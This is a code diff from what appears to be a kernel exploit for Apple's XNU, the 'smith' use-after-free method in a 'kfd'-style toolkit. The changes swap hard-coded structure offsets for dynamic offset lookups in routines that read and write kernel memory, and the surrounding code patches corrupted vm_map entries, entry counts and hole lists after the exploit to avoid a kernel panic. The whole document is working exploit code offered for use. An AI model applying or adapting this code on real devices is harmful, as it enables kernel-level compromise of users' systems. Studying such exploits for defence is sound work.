@@ -209,7 +209,7 @@ void smith_free(struct kfd* kfd)
  */
 void smith_helper_init(struct kfd* kfd)
 {
-    const u64 target_hole_size = pages(0);
+    const u64 target_hole_size = pages(10000);
     bool found_target_hole = false;
 
     struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
@@ -367,7 +367,7 @@ void* smith_helper_cleanup_pthread(void* arg)
          * with a right child that is not null, but not the entry we are going to leak.
          */
         u64 map_kaddr = kfd->info.kaddr.current_map;
-        u64 entry_kaddr = static_kget(struct _vm_map, hdr.links.prev, map_kaddr);
+        u64 entry_kaddr = dynamic_kget(vm_map__hdr_links_prev, map_kaddr);
 
         while (true) {
             u64 entry_prev = static_kget(struct vm_map_entry, links.prev, entry_kaddr);
@@ -431,8 +431,8 @@ void smith_helper_cleanup(struct kfd* kfd)
          * make sure the state of the VM map is corrupted as expected.
          */
         u64 entry_count = 0;
-        u64 entry_kaddr = static_kget(struct _vm_map, hdr.links.next, map_kaddr);
-        u64 map_entry_kaddr = map_kaddr + offsetof(struct _vm_map, hdr.links.prev);
+        u64 entry_kaddr = dynamic_kget(vm_map__hdr_links_next, map_kaddr);
+        u64 map_entry_kaddr = map_kaddr + dynamic_info(vm_map__hdr_links_prev);
         u64 first_vme_kaddr = 0;
         u64 first_vme_parent_store = 0;
         u64 second_vme_kaddr = 0;
@@ -517,10 +517,10 @@ void smith_helper_cleanup(struct kfd* kfd)
          * I believe this is not strictly necessary to prevent a kernel panic
          * when the process exits, but I like to patch it just in case.
          */
-        u64 nentries_buffer = static_kget(struct _vm_map, hdr.nentries, map_kaddr);
+        u64 nentries_buffer = dynamic_kget(vm_map__hdr_nentries, map_kaddr);
         i32 old_nentries = *(i32*)(&nentries_buffer);
         *(i32*)(&nentries_buffer) = (old_nentries - 1);
-        static_kset(struct _vm_map, hdr.nentries, nentries_buffer, map_kaddr);
+        dynamic_kset(vm_map__hdr_nentries, nentries_buffer, map_kaddr);
 
         /*
          * Patch map->hint.
@@ -528,7 +528,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          * We set map->hint to point to vm_map_to_entry(map), which effectively
          * means there is no valid hint.
          */
-        static_kset(struct _vm_map, hint, map_entry_kaddr, map_kaddr);
+        dynamic_kset(vm_map__hint, map_entry_kaddr, map_kaddr);
     } while (0);
 
     do {
@@ -539,7 +539,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          * along the way to make sure the state is corrupted as expected.
          */
         u64 hole_count = 0;
-        u64 hole_kaddr = static_kget(struct _vm_map, f_s._holes, map_kaddr);
+        u64 hole_kaddr = dynamic_kget(vm_map__holes_list, map_kaddr);
         u64 first_hole_kaddr = hole_kaddr;
         u64 prev_hole_end = 0;
         u64 first_leaked_hole_prev = 0;
@@ -590,7 +590,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          * We set map->hole_hint to point to the first hole, which is guaranteed
          * to not be one of the two holes that we just leaked.
          */
-        static_kset(struct _vm_map, vmmap_u_1.vmmap_hole_hint, first_hole_kaddr, map_kaddr);
+        dynamic_kset(vm_map__hole_hint, first_hole_kaddr, map_kaddr);
     } while (0);
 
     if (take_vm_map_lock) {
